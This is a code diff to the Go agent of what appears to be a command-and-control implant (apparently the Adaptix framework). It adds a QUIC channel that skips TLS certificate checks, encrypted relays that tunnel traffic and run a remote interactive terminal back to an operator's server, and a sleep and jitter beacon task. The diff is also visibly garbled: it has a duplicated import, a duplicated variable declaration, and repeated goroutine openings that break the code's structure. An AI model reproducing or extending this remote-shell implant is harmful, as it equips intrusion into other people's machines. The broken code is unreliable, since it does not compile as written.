@@ -14,6 +14,7 @@ import (
 	"gopher/bof/coffer"
 	"gopher/functions"
 	"gopher/utils"
+	"gopher/utils"
 	"io"
 	"net"
 	"os"
@@ -23,6 +24,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/quic-go/quic-go"
 	"github.com/vmihailenco/msgpack/v5"
 )
 
@@ -122,6 +124,9 @@ func TaskProcess(commands [][]byte) [][]byte {
 
 		case utils.COMMAND_ZIP:
 			data, err = taskZip(command.Data)
+
+		case utils.COMMAND_SLEEP:
+			data, err = taskSleep(command.Data)
 
 		default:
 			continue
@@ -1136,13 +1141,64 @@ func jobTunnel(paramsData []byte) {
 
 		go func() {
 			defer wg.Done()
-			io.Copy(clientConn, streamReader)
+		go func() {
+			defer wg.Done()
+			if profile.Protocol == "quic" {
+				// Framed Reader for QUIC: Conn -> Client
+				for {
+					encData, err := functions.RecvMsg(srvConn)
+					if err != nil {
+						break
+					}
+					if len(encData) > 0 {
+						decData := make([]byte, len(encData))
+						decStream.XORKeyStream(decData, encData)
+						_, err = clientConn.Write(decData)
+						if err != nil {
+							break
+						}
+					}
+				}
+			} else {
+				io.Copy(clientConn, streamReader)
+			}
 			closeAll()
 		}()
 
 		go func() {
 			defer wg.Done()
-			io.Copy(streamWriter, clientConn)
+		go func() {
+			defer wg.Done()
+			if profile.Protocol == "quic" {
+				// Framed Writer for QUIC: Client -> Conn
+				buf := make([]byte, 4096)
+				for {
+					n, err := clientConn.Read(buf)
+					if n > 0 {
+						encData := make([]byte, n)
+						encStream.XORKeyStream(encData, buf[:n])
+
+						tunPack := utils.TunnelPack{Id: uint(AgentId), ChannelId: params.ChannelId, Key: tunKey, Iv: tunIv, Alive: true, Data: encData}
+						tpData, _ := msgpack.Marshal(tunPack)
+
+						startMsg := utils.StartMsg{Type: utils.JOB_TUNNEL, Data: tpData}
+						smData, _ := msgpack.Marshal(startMsg)
+						
+						// Encrypt with Session Key
+						finalData, _ := utils.EncryptData(smData, encKey)
+
+						err = functions.SendMsg(srvConn, finalData)
+						if err != nil {
+							break
+						}
+					}
+					if err != nil {
+						break
+					}
+				}
+			} else {
+				io.Copy(streamWriter, clientConn)
+			}
 			closeAll()
 		}()
 
@@ -1176,7 +1232,29 @@ func jobTerminal(paramsData []byte) {
 		}
 
 		var srvConn net.Conn
-		if profile.Protocol == "udp" {
+		var srvConn net.Conn
+		if profile.Protocol == "quic" {
+			tlsConf := &tls.Config{
+				InsecureSkipVerify: true,
+				NextProtos:         []string{"adaptix-quic"},
+				MinVersion:         tls.VersionTLS12,
+			}
+			quicConf := &quic.Config{
+				MaxIdleTimeout:       30 * time.Second,
+				KeepAlivePeriod:      30 * time.Second,
+				HandshakeIdleTimeout: 30 * time.Second,
+			}
+			session, err := quic.DialAddr(context.Background(), profile.Addresses[0], tlsConf, quicConf)
+			if err == nil {
+				stream, err := session.OpenStreamSync(context.Background())
+				if err == nil {
+					srvConn = &functions.QUICStreamConn{Stream: stream, Session: session}
+				} else {
+					session.CloseWithError(0, "failed to open stream")
+					err = errors.New("failed to open stream")
+				}
+			}
+		} else if profile.Protocol == "udp" {
 			// UDP connection
 			udpAddr, err := net.ResolveUDPAddr("udp", profile.Addresses[0])
 			if err != nil {
@@ -1271,13 +1349,64 @@ func jobTerminal(paramsData []byte) {
 
 		go func() {
 			defer wg.Done()
-			functions.RelayConnToPty(ptyProc, streamReader)
+		go func() {
+			defer wg.Done()
+			if profile.Protocol == "quic" {
+				// Framed Reader for QUIC: Conn -> Pty
+				for {
+					encData, err := functions.RecvMsg(srvConn)
+					if err != nil {
+						break
+					}
+					if len(encData) > 0 {
+						decData := make([]byte, len(encData))
+						decStream.XORKeyStream(decData, encData)
+						_, err = ptyProc.Write(decData)
+						if err != nil {
+							break
+						}
+					}
+				}
+			} else {
+				functions.RelayConnToPty(ptyProc, streamReader)
+			}
 			closeAll()
 		}()
 
 		go func() {
 			defer wg.Done()
-			functions.RelayPtyToConn(streamWriter, ptyProc)
+		go func() {
+			defer wg.Done()
+			if profile.Protocol == "quic" {
+				// Framed Writer for QUIC: Pty -> Conn
+				buf := make([]byte, 4096)
+				for {
+					n, err := ptyProc.Read(buf)
+					if n > 0 {
+						encData := make([]byte, n)
+						encStream.XORKeyStream(encData, buf[:n])
+
+						termPack := utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: true, Data: encData}
+						tpData, _ := msgpack.Marshal(termPack)
+
+						startMsg := utils.StartMsg{Type: utils.JOB_TERMINAL, Data: tpData}
+						smData, _ := msgpack.Marshal(startMsg)
+						
+						// Encrypt with Session Key
+						finalData, _ := utils.EncryptData(smData, encKey)
+
+						err = functions.SendMsg(srvConn, finalData)
+						if err != nil {
+							break
+						}
+					}
+					if err != nil {
+						break
+					}
+				}
+			} else {
+				functions.RelayPtyToConn(streamWriter, ptyProc)
+			}
 			closeAll()
 		}()
 
@@ -1290,4 +1419,16 @@ func jobTerminal(paramsData []byte) {
 		_ = process.Wait()
 		cancel()
 	}()
+}
+func taskSleep(paramsData []byte) ([]byte, error) {
+	var params utils.ParamsSleep
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return nil, err
+	}
+
+	profile.Sleep = params.Sleep
+	profile.Jitter = params.Jitter
+
+	return nil, nil
 }
